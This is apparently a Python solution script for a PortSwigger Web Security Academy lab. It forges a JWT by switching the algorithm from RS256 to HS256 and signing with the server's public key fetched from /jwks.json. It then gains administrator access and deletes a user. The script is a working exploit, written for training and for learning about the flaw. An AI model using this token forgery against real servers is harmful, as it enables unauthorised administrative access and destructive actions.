"""
Lab 7: JWT authentication bypass via algorithm confusion
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-algorithm-confusion
Difficulty: Expert

📝 The flaw: server verifies with something like
  jwt.decode(token, key, algorithms=["RS256", "HS256"])
without pinning the algorithm to what was actually used to issue the token.
RS256's "key" is a PUBLIC key (meant only for verifying) — but under HS256,
the "key" is a shared SECRET used both to sign and verify. If we can get the
server's RSA public key, we can use its exact bytes as an HMAC-SHA256 secret:
the server ends up "verifying" our HMAC signature using that same public key
as the HMAC key — and it matches, because we're the one who generated it.

Requires: pip install pyjwt cryptography --break-system-packages
"""

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.serialization import load_pem_public_key

from utils import get_session, log, note, decode_jwt, forge_hs256_token

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
WIENER = {"username": "wiener", "password": "peter"}


def fetch_public_key_pem(s):
    """
    The public key is usually exposed somewhere reachable — /jwks.json most
    commonly. PyJWT's JWK -> PEM conversion isn't built in, so we round-trip
    through `cryptography`'s RSA public numbers if we only have the raw JWK.
    """
    r = s.get(f"{TARGET}/jwks.json")
    log(f"/jwks.json status: {r.status_code}")
    jwks = r.json()
    jwk = jwks["keys"][0]

    import base64
    def b64_to_int(s):
        padded = s + "=" * (-len(s) % 4)
        return int.from_bytes(base64.urlsafe_b64decode(padded), "big")

    n = b64_to_int(jwk["n"])
    e = b64_to_int(jwk["e"])

    from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
    pub = RSAPublicNumbers(e, n).public_key()
    pem = pub.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    return pem


def run():
    s = get_session()
    r = s.post(f"{TARGET}/login", data=WIENER)
    token = s.cookies.get("session")
    header, payload = decode_jwt(token)

    pem = fetch_public_key_pem(s)
    note("Using the server's own RSA public key PEM bytes as our HMAC secret.")

    header["alg"] = "HS256"
    payload["sub"] = "administrator"

    forged = forge_hs256_token(header, payload, key=pem)
    s.cookies.set("session", forged)

    r = s.get(f"{TARGET}/admin")
    log(f"/admin status: {r.status_code}")
    if r.status_code == 200:
        r = s.post(f"{TARGET}/admin/delete", params={"username": "carlos"})
        log(f"Delete carlos responded {r.status_code}")
    else:
        note("If this fails, try signing over the EXACT PEM bytes the server")
        note("itself would produce (line endings / trailing newline matter).")


if __name__ == "__main__":
    run()
